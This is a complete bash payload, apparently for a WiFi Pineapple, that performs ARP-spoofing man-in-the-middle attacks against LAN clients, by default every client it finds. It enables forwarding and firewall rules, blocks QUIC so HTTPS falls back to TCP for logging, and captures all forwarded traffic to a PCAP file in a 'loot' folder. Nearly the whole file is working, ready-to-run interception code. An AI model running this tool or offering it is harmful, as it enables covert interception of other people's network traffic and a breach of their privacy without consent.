#!/bin/bash
# Title: Start MITM Dump PCAP Capture
# Author: Janek
# Description: Starts ARP MITM against one LAN client and captures the forwarded traffic to PCAP.
# Version: 1.2

IFACE="wlan0cli"
LOOT_DIR="/root/loot/pcap"
STATE_PREFIX="/tmp/pcap_mitm"

TCPDUMP_PID_FILE="${STATE_PREFIX}.tcpdump.pid"
ARP_TARGET_PID_FILE="${STATE_PREFIX}.arp_target.pid"
ARP_GATEWAY_PID_FILE="${STATE_PREFIX}.arp_gateway.pid"
PATH_FILE="${STATE_PREFIX}.path"
IFACE_FILE="${STATE_PREFIX}.iface"
TARGET_FILE="${STATE_PREFIX}.target"
GATEWAY_FILE="${STATE_PREFIX}.gateway"
IP_FORWARD_FILE="${STATE_PREFIX}.ip_forward"
QUIC_FILE="${STATE_PREFIX}.quic"
FORWARD_RULES_FILE="${STATE_PREFIX}.forward_rules"
POISON_TOOL_FILE="${STATE_PREFIX}.poison_tool"
TCPDUMP_LOG="${STATE_PREFIX}.tcpdump.log"
ARP_TARGET_LOG="${STATE_PREFIX}.arp_target.log"
ARP_GATEWAY_LOG="${STATE_PREFIX}.arp_gateway.log"

mkdir -p "$LOOT_DIR"

is_confirmed() {
    [ "$1" = "1" ] || [ "$1" = "true" ] || {
        [ -n "$DUCKYSCRIPT_USER_CONFIRMED" ] && [ "$1" = "$DUCKYSCRIPT_USER_CONFIRMED" ]
    }
}

is_ipv4() {
    echo "$1" | grep -Eq '^[0-9]{1,3}(\.[0-9]{1,3}){3}$'
}

get_local_ipv4() {
    ip -4 addr show dev "$IFACE" 2>/dev/null | awk '/inet / { print $2; exit }' | cut -d/ -f1
}

is_process_running() {
    local pid="$1"
    local pattern="$2"

    [ -n "$pid" ] || return 1
    kill -0 "$pid" 2>/dev/null || return 1

    (ps w 2>/dev/null || ps 2>/dev/null) | awk -v pid="$pid" -v pattern="$pattern" '
        $1 == pid && index($0, pattern) > 0 { found = 1 }
        END { exit(found ? 0 : 1) }
    '
}

is_pid_running() {
    local pid="$1"

    [ -n "$pid" ] || return 1
    kill -0 "$pid" 2>/dev/null
}

any_pid_in_file_running() {
    local pid_file="$1"
    local pid

    [ -f "$pid_file" ] || return 1
    while IFS= read -r pid; do
        is_pid_running "$pid" && return 0
    done < "$pid_file"

    return 1
}

get_target_list() {
    if [ "${#TARGET_IPS[@]}" -gt 0 ] 2>/dev/null; then
        printf "%s\n" "${TARGET_IPS[@]}"
    elif [ -f "$TARGET_FILE" ]; then
        cat "$TARGET_FILE"
    elif [ -n "$TARGET_IP" ]; then
        echo "$TARGET_IP"
    fi
}

cleanup_state_files() {
    rm -f "$TCPDUMP_PID_FILE" "$ARP_TARGET_PID_FILE" "$ARP_GATEWAY_PID_FILE"
    rm -f "$PATH_FILE" "$IFACE_FILE" "$TARGET_FILE" "$GATEWAY_FILE"
    rm -f "$IP_FORWARD_FILE" "$QUIC_FILE" "$FORWARD_RULES_FILE" "$POISON_TOOL_FILE"
}

stop_pid_if_running() {
    local pid="$1"
    local signal="${2:-TERM}"

    [ -n "$pid" ] || return 0
    kill -0 "$pid" 2>/dev/null || return 0
    kill "-$signal" "$pid" 2>/dev/null || true
}

restore_ip_forward() {
    [ -f "$IP_FORWARD_FILE" ] || return 0
    OLD_FORWARD=$(cat "$IP_FORWARD_FILE" 2>/dev/null)
    case "$OLD_FORWARD" in
        0|1) echo "$OLD_FORWARD" > /proc/sys/net/ipv4/ip_forward 2>/dev/null ;;
    esac
}

remove_quic_block() {
    [ -f "$QUIC_FILE" ] || return 0
    QUIC_METHOD=$(cat "$QUIC_FILE" 2>/dev/null)

    case "$QUIC_METHOD" in
        nft)
            nft delete table inet pcap_mitm_quic 2>/dev/null || true
            ;;
        iptables)
            get_target_list | while IFS= read -r target_ip; do
                [ -n "$target_ip" ] || continue
                iptables -D FORWARD -s "$target_ip" -p udp --dport 443 -j DROP 2>/dev/null || true
            done
            ;;
    esac
}

remove_forward_rules() {
    [ -f "$FORWARD_RULES_FILE" ] || return 0
    FW_METHOD=$(cat "$FORWARD_RULES_FILE" 2>/dev/null)
    local target_ip

    case "$FW_METHOD" in
        iptables)
            get_target_list | while IFS= read -r target_ip; do
                [ -n "$target_ip" ] || continue
                iptables -D FORWARD -o "$IFACE" -d "$target_ip" -j ACCEPT 2>/dev/null || true
                iptables -D FORWARD -i "$IFACE" -s "$target_ip" -j ACCEPT 2>/dev/null || true
            done
            ;;
    esac
}

cleanup_on_error() {
    local pid

    for pid in "${ARP_TARGET_PIDS[@]}" "${ARP_GATEWAY_PIDS[@]}"; do
        stop_pid_if_running "$pid" TERM
    done
    stop_pid_if_running "$TCPDUMP_PID" INT
    remove_quic_block
    remove_forward_rules
    restore_ip_forward
    cleanup_state_files
}

ensure_tool() {
    local tool="$1"
    local package="$2"

    command -v "$tool" >/dev/null 2>&1 && return 0

    RESP=$(CONFIRMATION_DIALOG "$tool not found. Install package $package?")
    if ! is_confirmed "$RESP"; then
        ERROR_DIALOG "$tool is required for MITM Dump."
        return 1
    fi

    LOG yellow "Installing $package..."
    opkg update >/dev/null 2>&1
    opkg install "$package" >/dev/null 2>&1

    if ! command -v "$tool" >/dev/null 2>&1; then
        ERROR_DIALOG "Install failed: $package\nTry manually: opkg install $package"
        return 1
    fi

    return 0
}

arping_supports_option() {
    local option="$1"

    arping -h 2>&1 | grep -Fq -- "$option"
}

ensure_poison_tool() {
    if command -v arpspoof >/dev/null 2>&1; then
        POISON_TOOL="arpspoof"
        return 0
    fi

    if command -v arping >/dev/null 2>&1; then
        POISON_TOOL="arping"
        return 0
    fi

    RESP=$(CONFIRMATION_DIALOG "arpspoof not found.\nInstall iputils-arping fallback?")
    if ! is_confirmed "$RESP"; then
        ERROR_DIALOG "MITM Dump needs arpspoof or arping.\ndsniff is not available on this firmware feed."
        return 1
    fi

    LOG yellow "Installing iputils-arping..."
    opkg update >/dev/null 2>&1
    opkg install iputils-arping >/dev/null 2>&1

    if command -v arping >/dev/null 2>&1; then
        POISON_TOOL="arping"
        return 0
    fi

    ERROR_DIALOG "Install failed: iputils-arping\nNeed arpspoof or arping."
    return 1
}

run_arping_poison_loop() {
    local spoof_ip="$1"
    local peer_ip="$2"
    local log_file="$3"
    local mode_arg=""
    local arping_args=()

    if arping_supports_option "-A"; then
        mode_arg="-A"
    elif arping_supports_option "-U"; then
        mode_arg="-U"
    fi

    while true; do
        arping_args=()
        [ -n "$mode_arg" ] && arping_args+=("$mode_arg")
        arping_args+=(-I "$IFACE" -c 1)
        if arping_supports_option "-w"; then
            arping_args+=(-w 1)
        fi
        arping_args+=(-s "$spoof_ip" "$peer_ip")

        arping "${arping_args[@]}" >> "$log_file" 2>&1
        sleep 2
    done
}

start_poisoning() {
    local target_ip

    ARP_TARGET_PIDS=()
    ARP_GATEWAY_PIDS=()

    case "$POISON_TOOL" in
        arpspoof)
            for target_ip in "${TARGET_IPS[@]}"; do
                arpspoof -i "$IFACE" -t "$target_ip" "$GATEWAY_IP" >> "$ARP_TARGET_LOG" 2>&1 &
                ARP_TARGET_PIDS+=("$!")
                arpspoof -i "$IFACE" -t "$GATEWAY_IP" "$target_ip" >> "$ARP_GATEWAY_LOG" 2>&1 &
                ARP_GATEWAY_PIDS+=("$!")
            done
            ;;
        arping)
            for target_ip in "${TARGET_IPS[@]}"; do
                run_arping_poison_loop "$GATEWAY_IP" "$target_ip" "$ARP_TARGET_LOG" &
                ARP_TARGET_PIDS+=("$!")
                run_arping_poison_loop "$target_ip" "$GATEWAY_IP" "$ARP_GATEWAY_LOG" &
                ARP_GATEWAY_PIDS+=("$!")
            done
            ;;
        *)
            return 1
            ;;
    esac

    return 0
}

tcpdump_supports_option() {
    local option="$1"

    tcpdump -h 2>&1 | grep -Fq -- "$option"
}

apply_forward_rules() {
    local target_ip
    local applied=0

    if ! command -v iptables >/dev/null 2>&1; then
        LOG yellow "iptables not found; relying on existing firewall forwarding policy"
        echo "none" > "$FORWARD_RULES_FILE"
        return 0
    fi

    for target_ip in "${TARGET_IPS[@]}"; do
        if iptables -I FORWARD -i "$IFACE" -s "$target_ip" -j ACCEPT 2>/dev/null; then
            if iptables -I FORWARD -o "$IFACE" -d "$target_ip" -j ACCEPT 2>/dev/null; then
                applied=1
                continue
            fi

            iptables -D FORWARD -i "$IFACE" -s "$target_ip" -j ACCEPT 2>/dev/null || true
        fi

        LOG yellow "Could not add FORWARD accept rule for $target_ip"
    done

    if [ "$applied" -eq 1 ]; then
        echo "iptables" > "$FORWARD_RULES_FILE"
    else
        LOG yellow "Could not add FORWARD accept rules; MITM may depend on existing firewall policy"
        echo "none" > "$FORWARD_RULES_FILE"
    fi

    return 0
}

apply_quic_block() {
    local target_ip
    local failed=0
    local applied=0

    rm -f "$QUIC_FILE"

    if command -v nft >/dev/null 2>&1; then
        nft delete table inet pcap_mitm_quic 2>/dev/null || true
        if nft add table inet pcap_mitm_quic 2>/dev/null && \
            nft add chain inet pcap_mitm_quic forward '{ type filter hook forward priority -300; policy accept; }' 2>/dev/null; then
            for target_ip in "${TARGET_IPS[@]}"; do
                if nft add rule inet pcap_mitm_quic forward ip saddr "$target_ip" udp dport 443 counter drop 2>/dev/null; then
                    applied=1
                else
                    failed=1
                fi
            done

            if [ "$applied" -eq 1 ] && [ "$failed" -eq 0 ]; then
                echo "nft" > "$QUIC_FILE"
                return 0
            fi
        fi

        nft delete table inet pcap_mitm_quic 2>/dev/null || true
    fi

    if command -v iptables >/dev/null 2>&1; then
        failed=0
        applied=0
        for target_ip in "${TARGET_IPS[@]}"; do
            if iptables -I FORWARD -s "$target_ip" -p udp --dport 443 -j DROP 2>/dev/null; then
                applied=1
            else
                failed=1
            fi
        done

        if [ "$applied" -eq 1 ] && [ "$failed" -eq 0 ]; then
            echo "iptables" > "$QUIC_FILE"
            return 0
        fi

        for target_ip in "${TARGET_IPS[@]}"; do
            iptables -D FORWARD -s "$target_ip" -p udp --dport 443 -j DROP 2>/dev/null || true
        done
    fi

    echo "none" > "$QUIC_FILE"
    return 1
}

get_gateway_ip() {
    local gateway

    gateway=$(ip -4 route show default dev "$IFACE" 2>/dev/null | awk '/default/ { print $3; exit }')
    [ -n "$gateway" ] && is_ipv4 "$gateway" && echo "$gateway" && return 0

    gateway=$(ip -4 route show default 2>/dev/null | awk -v iface="$IFACE" '
        $1 == "default" && $0 ~ ("dev " iface) { print $3; exit }
    ')
    [ -n "$gateway" ] && is_ipv4 "$gateway" && echo "$gateway" && return 0

    return 1
}

collect_target_ips() {
    local gateway="$1"
    local default_ip
    local menu
    local selection
    local picker_status
    local ip_addr
    local mac_addr
    local state
    local line
    local target_ip
    local local_ip
    local already

    TARGET_IPS=()
    NEIGH_LABELS=()
    local_ip=$(get_local_ipv4)

    while IFS= read -r line; do
        ip_addr=$(echo "$line" | awk '{ print $1 }')
        mac_addr=$(echo "$line" | awk '{ for (i = 1; i <= NF; i++) if ($i == "lladdr") { print $(i + 1); exit } }')
        state=$(echo "$line" | awk '{ print $NF }')

        [ -n "$ip_addr" ] || continue
        is_ipv4 "$ip_addr" || continue
        [ "$ip_addr" = "$gateway" ] && continue
        [ -n "$local_ip" ] && [ "$ip_addr" = "$local_ip" ] && continue
        [ "$state" = "FAILED" ] && continue
        [ "$state" = "INCOMPLETE" ] && continue

        already=0
        for target_ip in "${TARGET_IPS[@]}"; do
            [ "$target_ip" = "$ip_addr" ] && already=1 && break
        done
        [ "$already" -eq 1 ] && continue

        TARGET_IPS+=("$ip_addr")
        NEIGH_LABELS+=("$ip_addr ${mac_addr:-unknown} $state")
    done < <(ip -4 neigh show dev "$IFACE" 2>/dev/null; ip neigh show dev "$IFACE" 2>/dev/null)

    if [ "${#TARGET_IPS[@]}" -gt 0 ]; then
        menu="MITM targets on $IFACE:\n"
        for i in "${!NEIGH_LABELS[@]}"; do
            menu="${menu}\n$((i + 1))) ${NEIGH_LABELS[$i]}"
        done
        menu="${menu}\n\nDefault: spoof ALL listed clients.\nChoose 2 only if you need manual IP."

        PROMPT "$menu" >/dev/null
        selection=$(NUMBER_PICKER "1=ALL, 2=Manual IP" "1")
        picker_status=$?
        case "$picker_status" in
            "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR")
                return 1
                ;;
        esac

        if [ "$selection" != "2" ]; then
            return 0
        fi
    else
        PROMPT "No clients in ip neigh on $IFACE.\nEnter target IP manually or wake target and retry." >/dev/null
    fi

    TARGET_IPS=()

    default_ip=$(echo "$gateway" | awk -F. '{ print $1 "." $2 "." $3 ".100" }')
    target_ip=$(IP_PICKER "IPv4 target" "$default_ip")
    TARGET_IPS+=("$target_ip")
}

if [ -f "$TCPDUMP_PID_FILE" ] || [ -f "$ARP_TARGET_PID_FILE" ] || [ -f "$ARP_GATEWAY_PID_FILE" ]; then
    OLD_TCPDUMP_PID=$(cat "$TCPDUMP_PID_FILE" 2>/dev/null)

    if is_process_running "$OLD_TCPDUMP_PID" "tcpdump" || \
        any_pid_in_file_running "$ARP_TARGET_PID_FILE" || \
        any_pid_in_file_running "$ARP_GATEWAY_PID_FILE"; then
        OLD_PATH=$(cat "$PATH_FILE" 2>/dev/null)
        OLD_TARGET=$(cat "$TARGET_FILE" 2>/dev/null)
        OLD_TARGET_COUNT=$(grep -c . "$TARGET_FILE" 2>/dev/null)
        ALERT "MITM PCAP ACTIVE\nTargets: $OLD_TARGET_COUNT\n$OLD_TARGET\nPlik:\n$OLD_PATH"
        LOG yellow "MITM PCAP already running: $OLD_PATH"
        exit 0
    fi

    OLD_IFACE=$(cat "$IFACE_FILE" 2>/dev/null)
    OLD_TARGET=$(cat "$TARGET_FILE" 2>/dev/null)
    [ -n "$OLD_IFACE" ] && IFACE="$OLD_IFACE"
    [ -n "$OLD_TARGET" ] && TARGET_IP="$OLD_TARGET"
    remove_quic_block
    remove_forward_rules
    restore_ip_forward
    cleanup_state_files
    IFACE="wlan0cli"
    TARGET_IP=""
fi

if ! ip -4 addr show dev "$IFACE" 2>/dev/null | grep -q "inet "; then
    ERROR_DIALOG "$IFACE has no IP.\nConnect Pineapple client mode to the target network first."
    exit 1
fi

ensure_tool tcpdump tcpdump || exit 1
ensure_poison_tool || exit 1

GATEWAY_IP=$(get_gateway_ip)
if [ -z "$GATEWAY_IP" ]; then
    ERROR_DIALOG "No default gateway on $IFACE."
    exit 1
fi

if ! collect_target_ips "$GATEWAY_IP"; then
    LOG yellow "MITM target selection cancelled"
    exit 0
fi

if [ "${#TARGET_IPS[@]}" -eq 0 ]; then
    ERROR_DIALOG "No MITM targets selected."
    exit 1
fi

VALID_TARGETS=()
for target_ip in "${TARGET_IPS[@]}"; do
    if ! is_ipv4 "$target_ip"; then
        LOG yellow "Skipping non-IPv4 neighbor: $target_ip"
        continue
    fi

    if [ "$target_ip" = "$GATEWAY_IP" ]; then
        LOG yellow "Skipping gateway: $target_ip"
        continue
    fi

    VALID_TARGETS+=("$target_ip")
done
TARGET_IPS=("${VALID_TARGETS[@]}")

if [ "${#TARGET_IPS[@]}" -eq 0 ]; then
    ERROR_DIALOG "No IPv4 MITM targets.\nip neigh IPv6 entries are ignored."
    exit 1
fi

TARGET_DISPLAY=$(IFS=,; echo "${TARGET_IPS[*]}")

RESP=$(CONFIRMATION_DIALOG "Start MITM Dump?\nTargets: ${#TARGET_IPS[@]}\n$TARGET_DISPLAY\nGateway: $GATEWAY_IP\nIface: $IFACE")
if ! is_confirmed "$RESP"; then
    LOG yellow "MITM Dump cancelled"
    exit 0
fi

QUIC_RESP=$(CONFIRMATION_DIALOG "Zeek HTTPS mode?\nBlock UDP/443 to force TCP TLS and ssl.log?")
QUIC_ENABLED="0"
if is_confirmed "$QUIC_RESP"; then
    QUIC_ENABLED="1"
fi

cat /proc/sys/net/ipv4/ip_forward 2>/dev/null > "$IP_FORWARD_FILE"
echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null
apply_forward_rules

if [ "$QUIC_ENABLED" = "1" ]; then
    if apply_quic_block; then
        LOG green "QUIC blocked (UDP/443) for forwarded traffic"
    else
        LOG yellow "Could not block QUIC; Zeek may log UDP/443 instead of ssl.log"
    fi
else
    echo "none" > "$QUIC_FILE"
fi

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
if [ "${#TARGET_IPS[@]}" -eq 1 ]; then
    PCAP_TARGET_TAG="${TARGET_IPS[0]}"
else
    PCAP_TARGET_TAG="all_${#TARGET_IPS[@]}"
fi
PCAP_FILE="$LOOT_DIR/mitm_traffic_${PCAP_TARGET_TAG}_${TIMESTAMP}.pcap"

TCPDUMP_ARGS=(-i "$IFACE" -s 0)
if tcpdump_supports_option "-B"; then
    TCPDUMP_ARGS+=(-B 4096)
fi
if tcpdump_supports_option "-U"; then
    TCPDUMP_ARGS+=(-U)
fi
TCPDUMP_ARGS+=(-w "$PCAP_FILE" -n)

: > "$TCPDUMP_LOG"
: > "$ARP_TARGET_LOG"
: > "$ARP_GATEWAY_LOG"

tcpdump "${TCPDUMP_ARGS[@]}" 2>"$TCPDUMP_LOG" &
TCPDUMP_PID=$!
sleep 1

if ! is_process_running "$TCPDUMP_PID" "tcpdump"; then
    TCPDUMP_ERROR=$(tail -n 5 "$TCPDUMP_LOG" 2>/dev/null)
    cleanup_on_error
    ERROR_DIALOG "tcpdump failed!\n$TCPDUMP_ERROR"
    exit 1
fi

if ! start_poisoning; then
    cleanup_on_error
    ERROR_DIALOG "No ARP poisoning backend available."
    exit 1
fi
sleep 2

for pid in "${ARP_TARGET_PIDS[@]}" "${ARP_GATEWAY_PIDS[@]}"; do
    if is_pid_running "$pid"; then
        continue
    fi

    ARP_ERROR="$(tail -n 3 "$ARP_TARGET_LOG" 2>/dev/null) $(tail -n 3 "$ARP_GATEWAY_LOG" 2>/dev/null)"
    cleanup_on_error
    ERROR_DIALOG "ARP poisoning failed!\n$ARP_ERROR"
    exit 1
done

echo "$TCPDUMP_PID" > "$TCPDUMP_PID_FILE"
printf "%s\n" "${ARP_TARGET_PIDS[@]}" > "$ARP_TARGET_PID_FILE"
printf "%s\n" "${ARP_GATEWAY_PIDS[@]}" > "$ARP_GATEWAY_PID_FILE"
echo "$PCAP_FILE" > "$PATH_FILE"
echo "$IFACE" > "$IFACE_FILE"
printf "%s\n" "${TARGET_IPS[@]}" > "$TARGET_FILE"
echo "$GATEWAY_IP" > "$GATEWAY_FILE"
echo "$POISON_TOOL" > "$POISON_TOOL_FILE"

ALERT "MITM PCAP START\nTargets: ${#TARGET_IPS[@]}\nGateway: $GATEWAY_IP\nPoison: $POISON_TOOL\nQUIC block: $QUIC_ENABLED\nPlik:\n$PCAP_FILE"
LOG green "MITM Dump active. targets=$TARGET_DISPLAY gateway=$GATEWAY_IP poison=$POISON_TOOL pcap=$PCAP_FILE"
LOG yellow "If ssl.log is still empty, check Zeek conn.log/quic.log and verify AP client isolation is off."
